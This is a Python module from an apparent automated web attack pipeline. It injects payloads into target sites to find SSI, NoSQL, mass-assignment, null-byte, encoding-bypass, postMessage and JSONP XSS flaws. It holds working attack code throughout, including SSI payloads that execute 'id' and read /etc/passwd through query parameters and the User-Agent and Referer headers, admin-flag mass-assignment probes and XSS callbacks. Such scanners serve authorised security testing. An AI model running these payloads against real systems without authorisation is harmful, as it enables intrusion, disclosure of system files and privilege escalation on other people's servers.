"""Encoding and bypass phases: SSI, JSON injection, null byte, double encoding, unicode, postMessage XSS, JSONP."""
from reconchain.phases.helpers import *


async def phase_100_SSI(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"100-SSI"}:
        return {}
    _out = outdir / "ssi_injection.txt"
    if _out.exists() and not force:
        return {"100-SSI": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 100-SSI: Server-Side Includes injection testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "100-SSI: no URLs; skipping")
        return {"100-SSI": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    _ssi_payloads = [
        '<!--#exec cmd="id"-->',
        '<!--#exec cmd="cat /etc/passwd"-->',
        '<!--#include virtual="/etc/passwd"-->',
        '<!--#echo var="DOCUMENT_ROOT"-->',
    ]
    _ssi_indicators = [
        "uid=", "root:", "gid=", "DOCUMENT_ROOT", "/etc/passwd",
        "<!--#exec", "<!--#include", "<!--#echo",
        "SSI", ".shtml", "Error parsing",
    ]
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    for u in param_urls[:_PIPELINE_CFG.sample_urls_ssi]:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() in _SKIP_PARAMS:
                continue
            for payload in _ssi_payloads:
                test_qs = qs.copy()
                test_qs[param_name] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                await _throttle_rate()
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body = body_bytes.decode("utf-8", errors="ignore")
                    for indicator in _ssi_indicators:
                        if indicator in body:
                            findings.append(f"[ssi-injection] {test_url} param={param_name} payload={payload}")
                            break
                except urllib.error.HTTPError as e:
                    try:
                        body = e.read().decode("utf-8", errors="ignore")
                        for indicator in _ssi_indicators:
                            if indicator in body:
                                findings.append(f"[ssi-injection] {test_url} param={param_name} payload={payload}")
                                break
                    except Exception:
                        pass
                except Exception:
                    continue
    # Test SSI via headers
    for u in param_urls[:_PIPELINE_CFG.sample_urls_ssi]:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
        for payload in _ssi_payloads:
            await _throttle_rate()
            try:
                head_req = urllib.request.Request(base_url, headers={"User-Agent": payload, **_extra_h})
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, head_req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                for indicator in _ssi_indicators:
                    if indicator in body:
                        findings.append(f"[ssi-header] {base_url} header=User-Agent payload={payload}")
                        break
            except Exception:
                pass
            await _throttle_rate()
            try:
                ref_req = urllib.request.Request(base_url, headers={"User-Agent": "Mozilla/5.0", "Referer": payload, **_extra_h})
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, ref_req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                for indicator in _ssi_indicators:
                    if indicator in body:
                        findings.append(f"[ssi-header] {base_url} header=Referer payload={payload}")
                        break
            except Exception:
                pass
    if not findings:
        findings.append("[ssi] No SSI injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"100-SSI: {len(findings)} findings → {out}")
    return {"100-SSI": str(out), "count": len(findings)}


async def phase_101_JSONINJECT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"101-JSONINJECT"}:
        return {}
    _out = outdir / "json_injection.txt"
    if _out.exists() and not force:
        return {"101-JSONINJECT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 101-JSONINJECT: JSON/noSQL injection and mass assignment testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "101-JSONINJECT: no URLs; skipping")
        return {"101-JSONINJECT": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    json_urls = [u for u in all_urls if "api" in u.lower() or "/json" in u.lower() or u.endswith(".json") or ".json?" in u]
    if not json_urls:
        json_urls = all_urls
    tested = 0
    for u in json_urls:
        if tested >= _PIPELINE_CFG.sample_urls_jsoninject:
            break
        await _throttle_rate()
        try:
            req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json", **_extra_h})
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            is_json = False
            ct = resp_headers.get("content-type", "")
            if "application/json" in ct:
                is_json = True
            if body.strip().startswith(("{", "[")):
                try:
                    json.loads(body)
                    is_json = True
                except (json.JSONDecodeError, ValueError):
                    pass
            if not is_json and "api" not in u.lower() and "/json" not in u.lower():
                continue
            tested += 1
            parsed = urllib.parse.urlparse(u)
            base = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
            nosql_payloads = [
                ('{"key": "value", "admin": true}', "admin"),
                ('{"key": {"$ne": ""}}', "$ne"),
                ('{"key": {"$gt": ""}}', "$gt"),
                ('{"key": {"$regex": ".*"}}', "$regex"),
                ('{"key": {"$where": "1==1"}}', "$where"),
            ]
            for payload_body, operator in nosql_payloads:
                await _throttle_rate()
                try:
                    post_req = urllib.request.Request(
                        base, data=payload_body.encode("utf-8"),
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", **_extra_h},
                        method="POST",
                    )
                    p_status, _, _ = await _async_urlopen(_urlopen, post_req, timeout=10)
                    if p_status in (200, 302):
                        findings.append(f"[nosql-operator] {base} field=body operator={operator}")
                except urllib.error.HTTPError as e:
                    if e.code in (200, 302):
                        findings.append(f"[nosql-operator] {base} field=body operator={operator}")
                except Exception:
                    pass
            mass_assign_fields = ["role", "admin", "is_admin", "user_id"]
            for field in mass_assign_fields:
                payload_body = json.dumps({"key": "value", field: True})
                await _throttle_rate()
                try:
                    post_req = urllib.request.Request(
                        base, data=payload_body.encode("utf-8"),
                        headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json", **_extra_h},
                        method="POST",
                    )
                    p_status, _, _ = await _async_urlopen(_urlopen, post_req, timeout=10)
                    if p_status in (200, 302):
                        findings.append(f"[mass-assignment] {base} field={field}")
                except urllib.error.HTTPError as e:
                    if e.code in (200, 302):
                        findings.append(f"[mass-assignment] {base} field={field}")
                except Exception:
                    pass
        except Exception:
            continue
    if not findings:
        findings.append("[jsoninject] No JSON injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"101-JSONINJECT: {len(findings)} findings → {out}")
    return {"101-JSONINJECT": str(out), "count": len(findings)}


async def phase_102_NULLBYTE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"102-NULLBYTE"}:
        return {}
    _out = outdir / "null_byte_injection.txt"
    if _out.exists() and not force:
        return {"102-NULLBYTE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 102-NULLBYTE: null byte injection testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "102-NULLBYTE: no URLs; skipping")
        return {"102-NULLBYTE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    file_params = {"file", "page", "template", "doc", "path", "view", "include", "load"}
    param_urls = [u for u in all_urls if "=" in u and not _is_static_url(u)]
    for u in param_urls[:_PIPELINE_CFG.sample_urls_nullbyte]:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        for param_name in qs:
            if param_name.lower() not in file_params:
                continue
            base_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
            )
            baseline_len = 0
            try:
                req = urllib.request.Request(base_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                baseline_len = len(body_bytes)
            except Exception:
                continue
            if baseline_len == 0:
                continue
            extensions = ["%00", "%00.jpg", "%00.html", "%00.php"]
            for ext in extensions:
                test_qs = qs.copy()
                test_qs[param_name] = [qs[param_name][0] + ext]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                await _throttle_rate()
                try:
                    req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                    s2, _, b2 = await _async_urlopen(_urlopen, req2, timeout=10)
                    new_len = len(b2)
                    if abs(new_len - baseline_len) > 50:
                        findings.append(
                            f"[null-byte] {test_url} param={param_name} payload={ext} "
                            f"baseline_len={baseline_len} new_len={new_len}"
                        )
                except Exception:
                    continue
    if not findings:
        findings.append("[null-byte] No null byte injection candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"102-NULLBYTE: {len(findings)} findings → {out}")
    return {"102-NULLBYTE": str(out), "count": len(findings)}


async def phase_103_DOUBLEENCOD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"103-DOUBLEENCOD"}:
        return {}
    _out = outdir / "double_encoding_bypass.txt"
    if _out.exists() and not force:
        return {"103-DOUBLEENCOD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 103-DOUBLEENCOD: double encoding bypass testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "103-DOUBLEENCOD: no URLs; skipping")
        return {"103-DOUBLEENCOD": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    payloads = [
        "%252e%252e%252f",
        "%252e%252e/",
        "%252f%252e%252e%252f",
        "%2527",
        "%2522",
    ]
    target_urls = [u for u in all_urls if "/" in urllib.parse.urlparse(u).path.rstrip("/") or "=" in u]
    for u in target_urls[:_PIPELINE_CFG.sample_urls_doubleencod]:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
        )
        baseline_status = 0
        try:
            req = urllib.request.Request(base_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            s0, _, _ = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            baseline_status = s0
        except urllib.error.HTTPError as e:
            baseline_status = e.code
        except Exception:
            continue
        for payload in payloads:
            encoded_path = parsed.path + "/" + payload if parsed.path else "/" + payload
            test_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, encoded_path, "", "", "")
            )
            await _throttle_rate()
            try:
                req2 = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                s2, _, _ = await _async_urlopen_no_redirect(_urlopen, req2, timeout=10)
                if s2 != baseline_status:
                    findings.append(
                        f"[double-encode-bypass] {test_url} payload={payload} "
                        f"baseline_status={baseline_status} new_status={s2}"
                    )
            except urllib.error.HTTPError as e:
                if e.code != baseline_status:
                    findings.append(
                        f"[double-encode-bypass] {test_url} payload={payload} "
                        f"baseline_status={baseline_status} new_status={e.code}"
                    )
            except Exception:
                continue
            if "=" in u:
                qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                if qs:
                    for param_name in qs:
                        test_qs = qs.copy()
                        test_qs[param_name] = [payload]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        param_test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        await _throttle_rate()
                        try:
                            req3 = urllib.request.Request(param_test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s3, _, _ = await _async_urlopen_no_redirect(_urlopen, req3, timeout=10)
                            if s3 != baseline_status:
                                findings.append(
                                    f"[double-encode-bypass] {param_test_url} payload={payload} "
                                    f"baseline_status={baseline_status} new_status={s3}"
                                )
                        except urllib.error.HTTPError as e:
                            if e.code != baseline_status:
                                findings.append(
                                    f"[double-encode-bypass] {param_test_url} payload={payload} "
                                    f"baseline_status={baseline_status} new_status={e.code}"
                                )
                        except Exception:
                            continue
    if not findings:
        findings.append("[double-encode] No double encoding bypass candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"103-DOUBLEENCOD: {len(findings)} findings → {out}")
    return {"103-DOUBLEENCOD": str(out), "count": len(findings)}


async def phase_104_UNICODE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"104-UNICODE"}:
        return {}
    _out = outdir / "unicode_bypass.txt"
    if _out.exists() and not force:
        return {"104-UNICODE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 104-UNICODE: Unicode normalization bypass attacks")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "104-UNICODE: no URLs; skipping")
        return {"104-UNICODE": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    overlong_payloads = [
        "%c0%af",
        "%c0%ae",
        "%00",
        "%c0%ae%c0%ae/",
        "%ef%bc%8f%c0%ae%c0%ae/",
    ]
    target_urls = [u for u in all_urls if "=" in u or urllib.parse.urlparse(u).path.strip("/")]
    for u in target_urls[:_PIPELINE_CFG.sample_urls_unicode]:
        parsed = urllib.parse.urlparse(u)
        base_url = urllib.parse.urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path, "", "", "")
        )
        for payload in overlong_payloads:
            test_path = parsed.path.rstrip("/") + "/" + payload.strip("/")
            test_url = urllib.parse.urlunparse(
                (parsed.scheme, parsed.netloc, test_path, parsed.query, "", "")
            )
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                s, _, b = await _async_urlopen(_urlopen, req, timeout=10)
                body = b.decode("utf-8", errors="ignore")
                hint = ""
                if s == 200:
                    hint = "accessible"
                elif s in (301, 302):
                    hint = "redirect"
                elif s in (403, 401):
                    hint = "blocked"
                if s in (200, 301, 302):
                    findings.append(f"[unicode-bypass] {test_url} payload={payload} response_hint={hint}")
            except urllib.error.HTTPError as e:
                if e.code not in (404, 410):
                    findings.append(f"[unicode-bypass] {test_url} payload={payload} response_hint=HTTP_{e.code}")
            except Exception:
                continue
        if "=" in u:
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if qs:
                for param_name in qs:
                    if param_name.lower() in _SKIP_PARAMS:
                        continue
                    for payload in overlong_payloads:
                        test_qs = qs.copy()
                        test_qs[param_name] = [payload]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        param_test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        await _throttle_rate()
                        try:
                            req = urllib.request.Request(param_test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s, _, b = await _async_urlopen(_urlopen, req, timeout=10)
                            body = b.decode("utf-8", errors="ignore")
                            hint = "accessible" if s == 200 else str(s)
                            if s in (200, 301, 302):
                                findings.append(f"[unicode-bypass] {param_test_url} payload={payload} response_hint={hint}")
                        except urllib.error.HTTPError as e:
                            if e.code not in (404, 410):
                                findings.append(f"[unicode-bypass] {param_test_url} payload={payload} response_hint=HTTP_{e.code}")
                        except Exception:
                            continue
    if not findings:
        findings.append("[unicode] No Unicode bypass candidates detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"104-UNICODE: {len(findings)} findings → {out}")
    return {"104-UNICODE": str(out), "count": len(findings)}


async def phase_105_POSTMSGXSS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"105-POSTMSGXSS"}:
        return {}
    _out = outdir / "postmessage_xss.txt"
    if _out.exists() and not force:
        return {"105-POSTMSGXSS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 105-POSTMSGXSS: postMessage XSS detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "105-POSTMSGXSS: no URLs; skipping")
        return {"105-POSTMSGXSS": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    _add_event_re = re.compile(r'addEventListener\s*\(\s*["\']message["\']', re.I)
    _onmessage_re = re.compile(r'window\.onmessage\s*=', re.I)
    _origin_check_re = re.compile(r'event\.origin', re.I)
    _dangerous_re = re.compile(r'\b(eval|innerHTML\s*=|document\.write|location\s*=|src\s*=)', re.I)
    for host in list(hosts)[:_PIPELINE_CFG.sample_hosts_postmsg]:
        await _throttle_rate()
        try:
            req = urllib.request.Request(host, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
            status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status != 200:
                continue
            body = body_bytes.decode("utf-8", errors="ignore")
            script_blocks = re.findall(r'<script[^>]*>(.*?)</script>', body, re.S | re.I)
            inline_scripts = re.findall(r'onmessage\s*=\s*function[^}]+}', body, re.S | re.I)
            for script_content in script_blocks + inline_scripts:
                has_listener = _add_event_re.search(script_content) or _onmessage_re.search(script_content)
                if not has_listener:
                    continue
                has_origin_check = _origin_check_re.search(script_content)
                has_dangerous = _dangerous_re.search(script_content)
                if not has_origin_check and has_dangerous:
                    findings.append(
                        f"[postmessage-xss] {host} "
                        f"issue=Message handler without origin validation uses dangerous API"
                    )
                elif not has_origin_check:
                    findings.append(
                        f"[postmessage-xss] {host} "
                        f"issue=Message handler missing event.origin validation"
                    )
                if has_origin_check and has_dangerous:
                    star_check = re.search(r'origin\s*[=!]==?\s*["\']\*["\']', script_content)
                    if star_check:
                        findings.append(
                            f"[postmessage-xss] {host} "
                            f"issue=Origin checked against wildcard '*'"
                        )
        except Exception:
            continue
    if not findings:
        findings.append("[postmessage-xss] No vulnerable postMessage handlers found")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"105-POSTMSGXSS: {len(findings)} findings → {out}")
    return {"105-POSTMSGXSS": str(out), "count": len(findings)}


async def phase_106_JSONP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"106-JSONP"}:
        return {}
    _out = outdir / "jsonp_endpoints.txt"
    if _out.exists() and not force:
        return {"106-JSONP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 106-JSONP: JSONP endpoint detection and abuse testing")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "106-JSONP: no URLs; skipping")
        return {"106-JSONP": str(_out), "count": 0}
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    callback_params = ["callback", "jsonp", "cb", "call", "jsonpcallback"]
    _jsonp_re = re.compile(r'^\s*(?:/\*\*/)?\s*test\s*\((.*)\)\s*;?\s*$', re.S | re.DOTALL)
    hosts = set()
    for u in all_urls:
        parsed = urllib.parse.urlparse(u)
        if parsed.netloc:
            hosts.add(f"{parsed.scheme}://{parsed.netloc}")
    xss_callbacks = ["alert(1)//", "<script>alert(1)</script>//"]
    for base_host in list(hosts)[:_PIPELINE_CFG.sample_hosts_jsonp]:
        for cp in callback_params:
            test_url = f"{base_host}/?{cp}=test"
            await _throttle_rate()
            try:
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                status, _, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                body = body_bytes.decode("utf-8", errors="ignore")
                if _jsonp_re.match(body):
                    findings.append(f"[jsonp-detected] {base_host} callback_param={cp}")
                    for xss_cb in xss_callbacks:
                        xss_url = f"{base_host}/?{cp}={urllib.parse.quote(xss_cb)}"
                        try:
                            req2 = urllib.request.Request(xss_url, headers={"User-Agent": "Mozilla/5.0", **_extra_h})
                            s2, _, b2 = await _async_urlopen(_urlopen, req2, timeout=10)
                            b2_body = b2.decode("utf-8", errors="ignore")
                            if xss_cb.replace("//", "") in b2_body and "alert" in b2_body:
                                findings.append(f"[jsonp-xss] {xss_url} payload={xss_cb}")
                        except Exception:
                            continue
            except Exception:
                continue
    if not findings:
        findings.append("[jsonp] No JSONP endpoints detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"106-JSONP: {len(findings)} findings → {out}")
    return {"106-JSONP": str(out), "count": len(findings)}
